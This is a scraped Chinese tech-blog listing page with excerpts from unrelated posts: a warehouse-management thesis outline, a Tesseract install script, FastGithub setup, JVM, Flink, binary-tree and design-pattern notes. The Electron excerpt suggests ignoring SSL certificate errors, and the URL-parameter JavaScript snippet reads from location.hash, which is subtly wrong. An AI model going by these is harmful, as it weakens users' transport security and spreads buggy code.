系统的选题背景和意义 选题背景： 随着电子商务的快速发展，快递行业迎来了蓬勃的发展机遇。然而，随之而来的是快递仓库管理面临的一系列挑战。传统的快递仓库管理方式存在一些问题，如人工操作繁琐、信息不准确、效率低下等。为了提高快递仓库管理的效率和准确性，开发一套快递仓库管理系统具有重要意义。该系统基于先进的技术和管理理念，通过优化仓库布局、自动化操作、实时监控等方式，为快递仓库提供一个高效、智能的管理平台。
意义： 快递仓库管理系统的设计与实现对于提高快递行业的运营效率和服务质量具有重要意义。首先，该系统可以优化仓库布局。传统的仓库布局往往是根据经验和直觉进行规划，容易出现空间浪费、物流路径冗余等问题。而通过快递仓库管理系统，可以利用先进的算法和模拟技术，对仓库布局进行优化。系统可以根据货物种类、流量分布等因素，合理规划货架位置、货物存放区域，最大限度地提高仓库空间的利用率和货物的存取效率。
其次，快递仓库管理系统可以实现自动化操作。传统的仓库管理方式往往需要大量的人工操作，容易出现人为错误和效率低下的问题。而通过该系统，可以引入自动化设备和机器人技术，实现货物的自动分拣、装载和搬运。系统可以根据订单信息和货物属性，自动将货物分配到对应的区域，并通过机器人进行快速、准确的搬运。这样不仅可以提高仓库操作的效率，还可以减少人力成本和人为错误的发生。
此外，快递仓库管理系统还可以实现实时监控。在传统的仓库管理方式下，仓库的运营情况往往难以及时了解和监控。而通过该系统，可以实时监控仓库的各项指标，如货物存储情况、货架空位、货物流动情况等。系统可以通过传感器和监控设备，实时采集数据并进行分析，提供仓库运营的实时状态和预警信息。这样可以帮助管理人员及时发现问题并采取相应的措施，提高仓库的运营效率和服务质量。
综上所述，快递仓库管理系统的设计与实现对于提高快递行业的运营效率和服务质量具有重要意义。通过优化仓库布局、实现自动化操作和实时监控，该系统可以为快递仓库提供一个高效、智能的管理平台，提高仓库操作的效率和准确性，提升快递行业的竞争力和用户体验。
以上选题背景和意义内容是根据本选题撰写，非本作品实际的选题背景、意义或功能。各位童鞋可参考用于写开题选题和意义内容切勿直接引用。本作品的实际功能和技术以下列内容为准。
技术栈： 前端Vue：用于构建交互式用户界面。
后端Java开发语言：使用Java作为后端开发语言。
Spring Boot框架：作为快速开发框架，替代了SSM框架，提供自动配置、快速构建等功能。
MySQL 5.7数据库：用于数据存储和管理。
使用Spring Boot，你可以通过依赖管理和自动配置来减少手动配置工作，并使用Spring框架的各种功能，如依赖注入、面向切面编程等。同时，Spring Boot还提供了用于构建RESTful API、集成测试和部署的工具和插件，使得开发过程更加高效和便捷。
3.3 系统功能分析 快递仓库管理系统主要有管理员和员工两个功能模块。以下将对这两个功能的作用进行详细的剖析。
管理员模块：管理员是系统中的核心用户，管理员登录后，可以对后台系统进行管理。主要功能有个人中心、员工管理、客户信息管理、供应商管理、货物类型管理、货物信息管理、货物入库管理、货物出库管理、仓库信息管理等功能。管理员用例如图3-1所示。
图3-1 管理员用例图
员工：员工进入系统可以实现对个人中心、货物信息管理、货物入库管理、货物出库管理等功能进行操作，员工用例如图3-2所示。
图3-2 员工用例图
3.4系统流程分析 3.4.1程序流程图设计 在本系统，非本系统的用户要想进行快递仓库就要注册本系统，登录时需要填写相应的资料，如有使用者，则会显示使用者名称已经存在，请再次键入使用者名称的提示框，若使用者不存在，则填写密码、确认密码等资料，并由系统判定密码与确认密码相符，确认无误后，填写使用者所填写的资料，即可进行登记。而且，为了保证系统的安全，只有在登录了本系统以后，才能进行快递仓库管理系统。该系统的工作流程见图3-3。
图3-3 程序流程图
3.4.2添加信息流程图设计 在添加信息的时候，会判断是哪类用户，并根据用户类型判断执行是否合法，合法者可以进行添加，不合法者则不能进行此操作。管理员登录账号后可以对内容进行添加，拥有着最高的权限，其他用户权限次于管理员。添加信息流程图如图3-4所示：
图3-4系统添加流程图
3.4.3删除信息流程图设计 删除数据时与添加数据功能类似，删除数据具体流程如图3-5所示：
图3-5系统删除流程图
4.1 系统总功能模块设计 快递仓库管理系统分两大部分，即管理员管理和员工管理。系统按照用户的实际需求开发而来，贴近生活。从管理员出拿到分配好的账号密码可以进入系统，使用相关的系统应用。管理员总体负责整体系统的运行维护，统筹协调。
系统整体模块设计：系统分为管理员和员工两大用户角色，系统管理员有最大的权限，整体功能展示如图4-1所示。
图4-1 系统整体功能图
4.2 系统数据库设计 4.2.1 数据库系统概要设计 从设计到制作研发一个系统，需要用到的技术很多，对于开发程序语言、数据库和框架布局都有严格的要求。该系统数据存放使用MySql的数据库，该数据库轻便快速，日常使使用系统十分稳定，更容易维护运行。
4.2.2 E-R模型结构设计 E-R图由实体与有关实体关联相结合构成的图，利用E-R图对清楚地表达出系统内的实体之间的关联。在系统中对一些主要的几个关键实体如下图。
(1) 仓库信息实体属性图如下图4-2所示。
图4-2仓库信息实体属性图
(2) 客户信息实体属性图如下图4-3所示。
图4-3客户信息实体属性图
(3) 货物信息实体属性图如下图4-4所示。
图4-4货物信息实体属性图
(4) 员工实体属性图如下图4-5所示。
图4-5员工实体属性图
(5) 供应商实体属性图如下图4-6所示。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/103124e1aff095bdca245b592a4a9eb7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07a7b355f69df70eea5279e8dde89167/" rel="bookmark">
			Centos7 下 部署开源tesseract-ocr完整教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Centos 7 下部署 tesseract5 我的 Centos7 是一个干净的系统，另外下述操作步骤亲测.
参考博客 http://www.nanstar.top/p/wiki_1649411481701https://segmentfault.com/a/1190000041832780 相关资源下载地址 https://download.csdn.net/download/qq_33547169/88168646
脚本 # 安装libjpeg-devel libpng-devel ，可以让 leptonica支持 png 和 peg 的图片。 # 具体最终支持哪些文件，可以通过 tesseract --version 命令查看 yum install -y automake ca-certificates g++ libtool make libtiff-devel libjpeg-devel libpng-devel centos-release-scl devtoolset-8-gcc* scl enable devtoolset-8 bash mv /usr/bin/gcc /usr/bin/gcc-4.8.5 ln -s /opt/rh/devtoolset-8/root/bin/gcc /usr/bin/gcc mv /usr/bin/g++ /usr/bin/g++-4.8.5 ln -s /opt/rh/devtoolset-8/root/bin/g++ /usr/bin/g++ # 如果下载了资源 可以跳过 wget wget http://www.leptonica.org/source/leptonica-1.82.0.tar.gz tar zxf leptonica-1.82.0.tar.gz cd leptonica-1.82.0/ ./configure &amp;&amp; make -j 100 &amp;&amp; make install # 配置环境变量 vi /etc/profile export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/usr/local/lib export LIBLEPT_HEADERSDIR=/usr/local/include export PKG_CONFIG_PATH=/usr/local/lib/pkgconfig source /etc/profile # 如果下载了资源 可以跳过 wget wget https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07a7b355f69df70eea5279e8dde89167/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a3604372ac760aa769a928e9c58b4c7f/" rel="bookmark">
			FastGithub下载及使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		GitHub访问问题 很多需要用到的脚本及软件会先发布在GitHub上，所以经常需要访问GitHub，但是每次都会卡在跳转到GitHub的步骤，就是还没开始就可以结束了。
之前尝试过手动修改host文件来解决网站的访问问题 以及更换网络但还是有时候无法如愿的访问GitHub
FastGithub 介绍 终于有一天我和大佬（一个超厉害的老师）抱怨无法正常访问GitHub的时候，大佬指着屏幕上的fast GitHub和我说试试这个
真是不试不知道 有一试吓一跳！
FastGithub是一个开源的软件主要为了使GitHub畅通无阻，有超大量的IP资源、快速的IP检测功能，以及微小的宽带占用，智能的DNS设置，并且支持多平台和加速GitHub的其它域名 github加速神器，解决github打不开、用户头像无法加载、releases无法上传下载、git-clone、git-pull、git-push失败等问题 fastgithub下载界面简介
FastGithub 下载 源代码是发布在GitHub上的，但是当我们无法正常访问GitHub的时候可以先下载发布在gitee上的旧版本 （已失效），等能正常访问GitHub的时候再下载使用最新的版本。目前还是2022年3月份更新的版本
下载最新版本
下载到指定的位置，我是下载到了D盘里面防止C盘内存不够
安装及使用 下载下来的是个zip的压缩包，解压缩之后找到.exe的运行程序，双击运行程序
运行程序
然后以管理员的身份运行cmd，输入运行FastGithub的命令即可运行 D:\software\fastgithub_win-x64是你将fast GitHub下载存放的位置
D:\software\fastgithub_win-x64\FastGithub.exe start #启动fast GitHub D:\software\fastgithub_win-x64\FastGithub.exe stop #停止fast GitHub 启动之后fast GitHub会自动更改你的dns
然后就可以顺畅无阻的访问GitHub啦！
在每次访问GitHub之前记得要先保证FastGithub在运行的状态 在安装完成之后可以直接点开fastgithub的执行文件就可以运行程序，顺利连接到Github。如果不能正常打开.exe的执行文件的话还是使用命令去启动，刚开始直接将执行文件拖到桌面是不能使用的，是在文件夹里面打开之后固定在任务栏之后可以正常使用。
安装GitHub上FastGithub的最新版本 当GitHub能正常跳转之后我们就可以下载安装GitHub上的FastGitHub的最新版本，或者现在的fastgithub官网上也是有最新版的下载链接的，安装使用方法一致
最新版安装使用
Linux下FastGithub及使用 我竟然忘记了服务器上面下载GitHub上的数据也是慢的离谱，所以呢需要下载linux上的FastGithub来进行加速
下载和安装FastGithub yum install libicu #先下载依赖包 wget -c https://github.com/dotnetcore/FastGithub/releases/download/2.0.4/fastgithub_linux-x64.zip # 下载FastGithub unzip fastgithub_linux-x64.zip #解压 cd fastgithub_linux-x64 #进入到FastGithub文件夹下 ./fastgithub #运行FastGithub 下载依赖包
下载FastGithub并解压
运行FastGithub
下载GitHub上的内容 因为当直接运行fast GitHub的时候会停在这个界面，下载东西不方便所以考虑将其直接挂载载后台运行，然后访问下载Github上的内容
nohup ./fastgithub 2&gt;&amp;1 &amp; #将程序挂载后台运行且不输出日志文件 wget -c https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a3604372ac760aa769a928e9c58b4c7f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9f851e574d3b9571a1ec19b9770dce7/" rel="bookmark">
			向量数据库
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 什么是矢量数据库 https://www.pinecone.io/learn/vector-database/
2. 数据预处理 数据在存入向量数据库前，需先做embedding转化为向量
什么是矢量嵌入：
https://www.pinecone.io/learn/vector-embeddings-for-developers/
https://platform.openai.com/docs/guides/embeddings/what-are-embeddings
embedding 转换模型:https://www.sbert.net/docs/pretrained_models.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/47b171d4c28bf70d86b722a3a6617cae/" rel="bookmark">
			JS 获取URL 某个参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 // 假设 URL 为 https://example.com/?id=123&amp;name=John const urlParams = new URLSearchParams(window.location.hash); const id = urlParams.get('id'); // 返回 "123" const name = urlParams.get('name'); // 返回 "John" 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63df8644966dea4149a1ca9c486f6cea/" rel="bookmark">
			JVM详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、前言
1.什么是JVM?
2.学习路线
二、内存结构
1.程序计数器
2.虚拟机栈
3.本地方法栈
4.堆
5.方法区
6.直接内存
三、垃圾回收
1.如果判断对象可以回收
2.垃圾回收算法
3.垃圾回收器
CMS收集器
G1（Garbage First）收集器：区域化分代式
4.垃圾回收调优
四、类加载与字节码技术
1.类文件结构
2.字节码指令
图解方法执行流程
通过字节码指令分析问题
构造方法
方法调用
多态原理
异常处理
Synchronized
3.编译期处理
默认构造器
自动拆装箱
泛型集合取值
可变参数
foreach 循环
switch 字符串
switch 枚举
枚举类
try-with-resources
方法重写时的桥接方法
匿名内部类
4.类加载阶段
加载
连接
初始化
典型应用 - 完成懒惰初始化单例模式
5.类加载器
双亲委派模式
自定义类加载器
线程上下文类加载器（破坏双亲委派模式）
6.运行期优化
即时编译
方法内联
反射优化
一、前言 1.什么是JVM? 定义： Java Virtual Machine - java 程序的运行环境（ java 二进制字节码的运行环境） 好处： 一次编写，到处运行 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63df8644966dea4149a1ca9c486f6cea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9069dc5ad6d18ebef663ca745ceeb535/" rel="bookmark">
			hbase shell实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		启动hadoop
启动hbase
进入shell界面
创建表
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0ca3472a0454896f5cfe47d1dfbaff4e/" rel="bookmark">
			2024 机器学习/深度学习/Python数据分析可视化/必过毕业设计选题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		深度学习/机器学习篇 1、基于机器学习的反电信诈骗系统 数据集：互联网公开渠道获取。
技术：决策树、SVM算法、Django、MySQL。
功能：短信展示、诈骗短信判断、短信分析可视化、数据集管理。
2、基于机器学习的垃圾短信过滤识别系统 数据集：互联网公开渠道获取。
技术：决策树、SVM算法、Django、MySQL。
功能：登录注册、短信展示、垃圾短信判断、短信分析可视化、数据集管理。
3、基于机器学习的敏感话题识别系统 数据集：爬取的微博相关数据。
技术：贝叶斯算法、Django、MySQL。
功能：登录注册、微博展示、敏感话题判断、手动爬取数据、数据集管理。
4、基于LSTM的电商评论情感分析 数据集：爬取的京东评论相关数据。
技术：Flask、Sklearn。
功能：数据爬取、数据处理、数据可视化、情感分析、词云展示。
创新点：可手动指定爬取目标，分析目标的相关评论内容数据
5、基于LSTM的股票数据预测 数据集：爬取相关股票数据
技术：使用Pandas进行分析、Flask搭建页面
功能：股票爬取、数据处理、股票展示、数据可视化、股票预测、股票分类、股票推荐
6、基于Python的5G套餐潜在客户预测系统的设计与实现 数据集：数据来源为中国移动历史数据。该数据集覆盖了用户的基本资料、消费信息、超套信息、宽带信息、其他信息等维度
技术：使用Python语言，Pandas进行数据处理，Echarts可视化、Flask搭建框架、随机森林算法预测
7、LSTM+Holt实现北京市空气质量数据可视化分析 数据集：爬取2345天气网；
分析可视化技术：使用Pandas进行数据分析，Echarts进行可视化，使用Flask框架；
功能：温度分析、天气分析、风向分析、空气质量分析、机器学习、对空气质量进行预测，登录注册
8、基于spark的房价数据分析预测推荐系统 数据集：爬取58同城房价数据
技术：Pandas、Spark、Echarts、Flask、协同过滤推荐
功能：数据爬取、数据处理、数据可视化、房价预测、房屋推荐、数据管理、用户管理
9、基于Python的面部健康特征判别系统 数据集：互联网获取的公开数据集，分为健康、亚健康和不健康，面部表情张图片共有1000张，舌头图像共有1000张
技术：Python、Flask、MobileNet
功能：主要分为模型训练和前台识别测试界面，界面中包含图像上传、识别结果返回的功能。模型训练包括读取图像、处理图像、模型训练、利用训练好的模型进行图像识别等。
10、基于决策树的企业员工离职率分析和预测 数据集：来源于Kaggle，是某公司的离职数据，包含14999条记录
技术：Pandas、Flask、决策树
功能：数据数据处理、数据可视化、手动添加数据进行员工离职预测
11、基于Python新闻文本分类的设计与实现 数据集：通过爬取中国新闻网站的网页数据获取
技术：采用了Python语言、Flask技术、B/S架构、贝叶斯算法。
功能：通过Python爬虫代码对新闻数据进行获取，获取的新闻数据包含了对应的分类标签。其次对获取的新闻数据进行处理，处理方法包括去除重复值、去除异常值、截取纯文本和标签列等等；然后对新闻数据进行简单的分析可视化，查看数据分布的规律；最后利用朴素贝叶斯模型，对新闻文本数据进行分类，分类之前要进行分词、去停用词、向量化等处理，得到模型之后对模型效果进行评估。
12、基于数据挖掘的高校学生行为与成绩的关联性研究 数据集：本次采用的数据集来源于智慧中国杯，数据内容为2013~2014、2014~2015两学年的学生在校行为数据作为原始数据，包括消费数据、图书借阅数据、寝室门禁数据、图书馆门禁数据、学生成绩排名数据
功能：本课题研究以 Python变成语言为基础，对学生行为数据进行分析，采用相关性分析对学生的行为和成绩进行分析，最后使用Echart可视化框架，结合FlaskWeb框架，展示可视化分析结果。
创新点：这一研究，不仅可以帮助辅导员、家长对学生行为状况进行监测和预警，亦可以帮助学校提供更加精准的教育服务和管理决策。
13、基于NLP的微博情感分析 数据集：爬取相关话题的微博数据
技术：通过综合应用Python技术、NLP模型、Flask框架
功能：对微博网站所采集到的相关信息及时进行清洗、筛选、分词以及分析。将分析过后的数据存储到数据库中。对分析过后的数据进行可视化展示，制作高频词汇的词云，方便用户更直观看出此时的热点，再利用NLP和贝叶斯进行微博言论的情感分析。
14、基于bp神经网络的房价预测系统 数据集：爬取58同城的二手房数据
技术Python技术、bp神经网络模型、Flask框架
功能：数据的爬取、预处理、分析、可视化。系统功能包括登录注册、房价数据展示、房价变化趋势、各区房价对比、房间数和朝向分析、房价预测等。
15、门店顾客口罩检测报警系统 数据集：戴口罩和不戴口罩的图像数据集
技术：PyTorch、MobileNetV2、Yolo、PyQt
功能：包括图像预处理、模型搭建、模型评估、GUI界面搭建等步骤，为用户提供视频上传功能，采用Python技术搭建页面，帮助门店将未戴口罩的人群进行识别和报警。
创新点：本选题将探索一种基于深度学习的人脸口罩识别算法，以用于快速自动识别人群是否佩戴口罩。该项人脸口罩识别算法将有效降低公共场所检查是否佩戴口罩时病毒传播的风险，即有利于提高检查速度与效率、降低人力成本。
16、基于机器学习的汽车销量预测 数据集：爬取的汽车数据以及获取的经济相关数据，
技术：Sklearn、Flask、逻辑回归算法
功能：根据国内生产总值当季值、汽油价格、人民币贷款基准利率、汽车总产量、公路里程数、汽车整车股票指数、消费者信心指数等来预测汽车销量，并展示汽车销量数据的可视化结果。
17、基于人脸识别的课堂签到系统 数据集：通过摄像头采集人脸数据
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0ca3472a0454896f5cfe47d1dfbaff4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/56d42179c55093ccc356450f0366cf2b/" rel="bookmark">
			Flink作业调度的9种状态
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.什么是作业调度 Flink 通过 Task Slots 来定义执行资源。每个 TaskManager 有一到多个 task slot，每个 task slot 可以运行一条由多个并行 task 组成的流水线。 这样一条流水线由多个连续的 task 组成，比如并行度为 n 的 MapFunction 和 并行度为 n 的 ReduceFunction。
例如：一个由数据源、MapFunction 和 ReduceFunction 组成的 Flink 作业，其中数据源和 MapFunction 的并行度为 4 ，ReduceFunction 的并行度为 3 。流水线由一系列的 Source - Map - Reduce 组成，运行在 2 个 TaskManager 组成的集群上，每个 TaskManager 包含 3 个 slot，整个作业的运行如下图所示。
2.作业调度的9种状态 当创建一个Flink任务后，该任务可能会经历多种状态。目前Flink给任务共定义了9种状态，包括：
CreatedRunningFinishedCancellingCanceledRestartingFailingFailedSuspended 具体状态流转如下图所示：
具体流程分成以下几个场景：
正常流程： Flink 作业正常启动处于 created 状态，启动成功后切换到 running 状态，当所有任务都执行完之后会切换到 finished 状态。作业失败：如果遇到失败的话，作业首先切换到 failing 状态以便取消所有正在运行的 task。如果所有 job 节点都到达最终状态并且 job 无法重启， 那么 job 进入 failed 状态。作业重试：如果配置了失败重试次数，任务会自动尝试重启，如果重启成功，那么任务会从Restarting 状态变更为 Created 继而再处于 Running 状态，如果重启失败且已无法恢复，那么任务会等所有tasks都进入到最终状态后变更为Failed状态。作业取消：如果用户取消了 job 话，它会进入到 cancelling 状态，并取消所有正在运行的 task。当所有正在运行的 task 进入到最终状态的时候，job 进入 cancelled 状态。 Finished、canceled 和 failed 会导致全局的终结状态，并且触发作业的清理。跟这些状态不同，suspended 状态只是一个局部的终结。局部的终结意味着作业的执行已经被对应的 JobManager 终结，但是集群中另外的 JobManager 依然可以从高可用存储里获取作业信息并重启。因此一个处于 suspended 状态的作业不会被彻底清理掉。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/56d42179c55093ccc356450f0366cf2b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7ab0f4c47c1ff001a2a969a4d46af105/" rel="bookmark">
			Electron 开发，报handshake failed； returned -1, SSL error code 1,错误
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		代码说明 在preload.js代码中，暴露参数给渲染线程renderer.js访问，
renderer.js
报：ERROR:ssl_client_socket_impl.cc(978)] failed; returned -1, SSL error code 1,错误
问题原因 如题所说，跨进程传递消息，这意味着访问将尝试建立一个不安全的连接，而ssl证书验证失败，无法建立连接。
所以我们要做的是：如何让electron允许建立不安全的连接
解决方法 在建立连接之前，先设置忽略认证异常，即修改代码如下：
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a55cca2cdc31b57695a216d18cf1170c/" rel="bookmark">
			算法刷题总结 (十一) 二叉树
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		算法总结11 二叉树 一、二叉树的概念1.1、什么是二叉树？1.2、二叉树的常见类型1.2.1、无数值（1）、满二叉树（2）、完全二叉树 1.2.2、有数值（3）、二叉搜索树（4）、平衡二叉搜索树 1.3、二叉树的存储方式（1）、链式存储方式（2）、顺序存储方式 1.4、二叉树的遍历方式1.5、二叉树的递归遍历（1）、前序遍历（2）、中序遍历（3）、后序遍历 1.6、二叉树的迭代遍历（1）、前序遍历（2）、中序遍历（3）、后序遍历 1.7、二叉树的统一迭代法（1）、前序遍历（2）、中序遍历（3）、后序遍历 1.8、二叉树的层序遍历 二、经典例题2.1、前中后序遍历144.二叉树的前序遍历94.二叉树的中序遍历145.二叉树的后序遍历 2.2、层序遍历102.二叉树的层序遍历107.二叉树的层次遍历II199.二叉树的右视图637.二叉树的层平均值429.N叉树的层序遍历515.在每个 树行中找最大值116.填充每个节点的下一个右侧节点指针117.填充每个节点的下一个右侧节点指针II104.二叉树的最大深度111.二叉树的最小深度 2.3、其他类型617.合并二叉树105. 从前序与中序遍历序列构造二叉树106.从中序与后序遍历序列构造二叉树剑指 Offer 68 - II. 二叉树的最近公共祖先235. 二叉搜索树的最近公共祖先98.验证二叉搜索树652. 寻找重复的子树 2.4、其他经典练习题226.翻转二叉树101. 对称二叉树104.二叉树的最大深度111.二叉树的最小深度222.完全二叉树的节点个数110.平衡二叉树257. 二叉树的所有路径404.左叶子之和513.找树左下角的值112. 路径总和654.最大二叉树700.二叉搜索树中的搜索530.二叉搜索树的最小绝对差501.二叉搜索树中的众数236. 二叉树的最近公共祖先701.二叉搜索树中的插入操作450.删除二叉搜索树中的节点669. 修剪二叉搜索树108.将有序数组转换为二叉搜索树538.把二叉搜索树转换为累加树 一、二叉树的概念 二叉树作为一个基础的数据结构，遍历算法作为一个基础的算法，两者结合当然是经典的组合了。很多题目都会有他的身影，有直接问二叉树的遍历的，有间接问的。比如要你找到树中满足条件的节点，就是间接考察树的遍历，因为你要找到树中满足条件的点，就需要进行遍历。你如果掌握了二叉树的遍历，那么也许其他复杂的树对于你来说也并不遥远了。
1.1、什么是二叉树？ 二叉树（Binary tree）是树形结构的一个重要类型。许多实际问题抽象出来的数据结构往往是二叉树形式，即使是一般的树也能简单地转换为二叉树，而且二叉树的存储结构及其算法都较为简单，因此二叉树显得特别重要。二叉树特点是每个节点最多只能有两棵子树，且有左右之分。
二叉树是n个有限元素的集合，该集合或者为空、或者由一个称为根（root）的元素及两个不相交的、被分别称为左子树和右子树的二叉树组成，是有序树。当集合为空时，称该二叉树为空二叉树。在二叉树中，一个元素也称作一个节点 。
总之：二叉树（binary tree）是指树中节点的度不大于2的有序树，它是一种最简单且最重要的树。二叉树的递归定义为：二叉树是一棵空树，或者是一棵由一个根节点和两棵互不相交的，分别称作根的左子树和右子树组成的非空树；左子树和右子树又同样都是二叉树
1.2、二叉树的常见类型 1.2.1、无数值 （1）、满二叉树 满二叉树：如果一棵二叉树只有度为0的结点和度为2的结点，并且度为0的结点在同一层上，则这棵二叉树为满二叉树。
如图所示：
这棵二叉树为满二叉树，也可以说深度为 k k k，有 2 k − 1 2^k-1 2k−1个节点的二叉树。
（2）、完全二叉树 完全二叉树的定义如下：在完全二叉树中，除了最底层节点可能没填满外，其余每层节点数都达到最大值，并且最下面一层的节点都集中在该层最左边的若干位置。若最底层为第 h h h 层，则该层包含 1 − 2 ( h − 1 ) 1- 2^{(h-1)} 1−2(h−1) 个节点。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a55cca2cdc31b57695a216d18cf1170c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63616d2b88dfe467b3358eb14c96e9d2/" rel="bookmark">
			智能电话语音机器人：为企业营销开启新时代
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引言：
随着科技的不断进步和智能化的发展，电话语音机器人作为一种全新的营销工具，正逐渐成为企业提升客户服务和销售业绩的重要利器。电话语音机器人能够通过自然语言处理和语音识别技术与客户进行智能对话，为企业提供高效、准确的电话营销服务。本文将重点介绍电话语音机器人在企业营销中的优势和应用场景。
一、提升客户服务质量
电话语音机器人可以通过预设的问答模式和信息数据库，为客户提供快速、准确的解答和服务。无论客户有任何疑问或需求，电话语音机器人都能够提供全天候的在线服务，帮助客户解决问题，提升客户满意度。同时，电话语音机器人也能够自动记录客户的信息和需求，为企业提供有价值的市场调研和客户分析数据。
二、提高销售效率
电话语音机器人能够根据客户的需求和购买意向，智能化地进行产品推荐和销售引导。通过语音识别技术，电话语音机器人可以准确判断客户的需求，并根据企业的销售策略进行个性化推荐，有效提高销售转化率。此外，电话语音机器人还能够自动跟进客户，提供售后服务和促销活动信息，增强客户的忠诚度和购买意愿。
三、降低运营成本
相比传统的人工客服团队，电话语音机器人具有明显的成本优势。电话语音机器人可以实现自动化的客户服务和销售过程，不需要额外的人力资源和培训成本。同时，电话语音机器人还能够同时为多个客户提供服务，无需等待和排队，大幅提高服务效率，降低企业的运营成本。
四、应用场景举例
电商企业：电话语音机器人可以为客户提供产品咨询、订单查询和退换货服务，提升购物体验和客户满意度。金融机构：电话语音机器人可以为客户提供贷款咨询、账户查询和理财建议，提高金融服务的便捷性和效率。售后服务：电话语音机器人可以为客户提供产品故障排查和售后支持，解决客户问题，增强品牌的口碑和信任度。 结论：
电话语音机器人作为一种智能化的营销工具，为企业提供了高效、准确的客户服务和销售支持。通过提升客户服务质量、提高销售效率和降低运营成本，电话语音机器人为企业带来了巨大的商机和竞争优势。未来，随着技术的进一步发展，电话语音机器人将在各个行业继续发挥重要的作用，为企业营销开启全新的时代。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9018cc32040b7140b4189b27d623b3f6/" rel="bookmark">
			【设计模式——学习笔记】23种设计模式——访问者模式Visitor（原理讲解&#43;应用场景介绍&#43;案例介绍&#43;Java代码实现）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 案例引入要求传统方案 介绍基本介绍应用场景登场角色尚硅谷版本《图解设计模式》版本 案例实现案例一实现拓展 案例二(个人感觉这个案例较好)实现分析拓展一拓展二拓展三 总结额外知识双重分发 文章说明 案例引入 要求 测评系统需求：将观众分为男人和女人，对歌手进行测评，当看完某个歌手表演后，得到他们对该歌手不同的评价(比如 成功、失败 等)
传统方案 Man和Woman里面都有“成功”、“失败”的方法
【分析】
如果系统比较小，这样设置是可以的，但是考虑系统增加越来越多新的功能时，对代码改动较大（如需要增加一个新的评价方式，就需要在Man和Woman类中同时添加），违反了ocp原则，不利于维护扩展性不好，比如增加了新的人员类型，或者增加新的评价，都需要修改很多代码 【改进】
使用访问者模式
介绍 基本介绍 在数据结构中保存着许多元素，我们会对这些元素进行“处理”。这时，“处理”代码放在哪里比较好呢？通常的做法是将它们放在表示数据结构的类中。但是，如果“处理”有许多种呢？这种情况下，每当增加一种处理，我们就不得不去修改表示数据结构的类。在Visitor模式中，数据结构与处理被分离开来。我们编写一个表示“访问者”的类来访问数据结构中的元素，并把对各元素的处理交给访问者类。这样，当需要增加新的处理时，我们只需要编写新的访问者，然后让数据结构可以接受访问者的访问即可即访问者模式主要将数据结构与数据操作分离，解决数据结构和操作耦合性问题访问者模式的基本工作原理是: 在被访问的类里面提供一个对外接待访问者的接口 应用场景 需要对一个对象结构中的对象进行很多不同操作（而且这些操作彼此没有关联），需要避免让这些操作"污染"这些对象的类，可以选用访问者模式解决 登场角色 Visitor ：是抽象访问者，为该对象结构中的ConcreteElement的每一个类声明一个visit方法ConcreteVisitor：是一个具体的访问者，实现Visitor声明的每个方法ObjectStructure：能枚举它的元素，可以提供一个高层的接口，用来允许访问者访问元素（比如案例一的ObjectStructure类的display方法）Element：定义一个accept 方法，接收一个访问者对象ConcreteElement：为具体元素，实现了accept 方法 尚硅谷版本 《图解设计模式》版本 Visitor(访问者)：Visitor角色负责对数据结构中每个具体的元素(ConcreteElement角色)声明一个用于访问XXXXX的visit(XXXXX)方法。visit(XXXXX)是用于处理XXXXX的方法负责实现该方法的是ConcreteVisitor角色ConcreteVisitor(具体的访问者)：ConcreteVisitor角色负责实现 Visitor角色所定义的接口(API)。它要实现所有的visit(XXXXX)方法，即实现如何处理每个ConcreteElement角色Element(元素)：Element角色表示Visitor角色的访问对象。它声明了接受访问者的accept方法。accept 